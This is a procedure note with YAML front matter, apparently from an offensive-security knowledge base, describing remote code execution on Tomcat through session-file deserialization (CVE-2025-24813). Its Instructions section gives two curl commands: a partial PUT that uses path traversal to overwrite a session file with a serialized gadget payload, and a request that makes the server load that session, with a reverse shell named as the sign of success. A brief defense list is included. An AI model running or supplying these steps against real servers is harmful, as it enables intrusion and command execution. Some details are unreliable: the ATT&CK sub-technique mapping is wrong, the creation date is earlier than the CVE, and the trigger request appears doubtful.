---
tags:
  - tomcat
  - rce
  - deserialization
  - session-persistence
  - cve-2025-24813
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-session-injection-put]]'
  - '[[commands/curl-trigger-session]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:25:17.466Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1203.001]]'
id: 7395be03-122b-481e-b26c-a4bdede9ed36
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Achieve-RCE-via-Session-Deserialization

## Summary

This procedure injects malicious serialized data into Tomcat session files using partial PUT manipulation, triggering a deserialization vulnerability to achieve remote code execution when the application loads the tampered session.

## Description

If the application uses file-based session persistence in the default work directory (e.g., work/Catalina/localhost/app/SESSIONS) and includes a library vulnerable to deserialization (e.g., ysoserial payloads for Commons Collections), attackers can overwrite session files (.ser) with gadgets that execute commands upon deserialization. Target: Tomcat 9.0.98 apps with persistent sessions. Outcomes: System command execution and potential escalation. Prerequisites: File manipulation capability and crafted deserialization payload.

## Requirements

1. File-based session persistence enabled in default location.
2. Deserialization-vulnerable library in the app classpath.
3. Crafted malicious serialized payload (e.g., via ysoserial).

## Defense

Defensive measures and detection strategies:

- Use database or memory-based session storage instead of files.
- Validate and sanitize session data before deserialization.
- Deploy RASP or WAF to block deserialization gadgets; monitor for anomalous file writes in work dir.

## Objectives

1. Inject deserialization payload into session file.
2. Trigger payload execution via session load.
3. Execute arbitrary commands for RCE.

## Instructions

### Step 1: Inject Payload into Session File

**Context**: Target a session file path with partial PUT to overwrite with serialized gadget.

**Command** ([[commands/curl-session-injection-put]]):
```bash
curl -X PUT --header "Content-Range: bytes 0-999/1000" --data-binary @payload.ser http://target:8080/public/upload/../../work/Catalina/localhost/app/SESS.<hash>.ser -v
```

> Uploads binary payload; path traversal via dots allows targeting SESS files. Expect 200 on success.

### Step 2: Trigger Deserialization

**Context**: Access the application to load the tampered session, executing the gadget.

**Command** ([[commands/curl-trigger-session]]):
```bash
curl http://target:8080/app/login?session=tainted -v
```

> Forces session load; monitor for RCE indicators like reverse shell connection or log entries.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- [[T1203.001]] Shared Modules

## Commands Used

- [[commands/curl-session-injection-put]]
- [[commands/curl-trigger-session]]

## Tools Used


## Tags

- rce
- deserialization
- session-hijack
